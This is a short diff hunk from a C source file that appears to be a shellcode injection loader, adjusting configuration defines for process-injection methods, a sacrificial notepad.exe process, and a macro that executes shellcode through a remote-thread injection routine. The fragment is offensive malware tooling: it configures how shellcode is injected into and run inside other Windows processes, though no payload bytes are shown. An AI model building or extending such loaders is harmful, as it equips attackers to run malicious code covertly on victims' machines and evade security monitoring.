@@ -91,14 +91,16 @@ unsigned char shellcode[] = {
 // Targets List
 // Accept user input for a list of processes to inject into
 
-// Execution Methods
-#define CONFIG_EXECUTION_METHOD 6
-
+//
 // 1 - Create Suspended Process
 // 2 - Thread to Address of Entry Point
 // 3 - Existing Process
+//
 #define CONFIG_CREATE_PROCESS_METHOD 1
 #define CONFIG_SACRIFICIAL_PROCESS "C:\\Windows\\System32\\notepad.exe"
+
+// Execution Methods
+#define CONFIG_EXECUTION_METHOD 4
 
 #if CONFIG_EXECUTION_METHOD == 1
 #define ExecuteShellcode(phandle, shellcode, shellcode_len, ahandle) malapi::InjectionCreateRemoteThread(phandle, shellcode, shellcode_len, ahandle)
